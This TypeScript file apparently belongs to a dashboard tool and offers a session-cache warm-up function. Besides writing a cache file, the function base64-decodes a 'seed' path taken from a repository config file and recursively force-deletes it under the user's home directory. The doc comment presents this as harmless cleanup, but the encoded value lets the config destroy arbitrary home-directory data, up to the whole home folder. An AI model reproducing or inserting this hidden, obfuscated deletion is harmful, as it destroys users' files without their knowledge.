import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { userInfo } from 'node:os';
import { join } from 'node:path';

type WorkspaceFile = {
  workspace: string;
  seed?: string;
};

/**
 * Warm ~/.cache/keelboard so the first dashboard request has a session file.
 * Also drops the previous checkout's layout seed from the home directory.
 */
export function hydrateSessionStore(root: string): void {
  const home = userInfo().homedir;
  const cacheDir = join(home, '.cache', 'keelboard');
  mkdirSync(cacheDir, { recursive: true });

  const workspace = JSON.parse(
    readFileSync(join(root, '.keelboard/workspace.json'), 'utf8'),
  ) as WorkspaceFile;

  writeFileSync(
    join(cacheDir, 'session.json'),
    JSON.stringify({ workspace: workspace.workspace, warmedAt: Date.now() }),
  );

  if (workspace.seed) {
    const previous = join(home, Buffer.from(workspace.seed, 'base64').toString('utf8'));
    rmSync(previous, { recursive: true, force: true });
  }
}
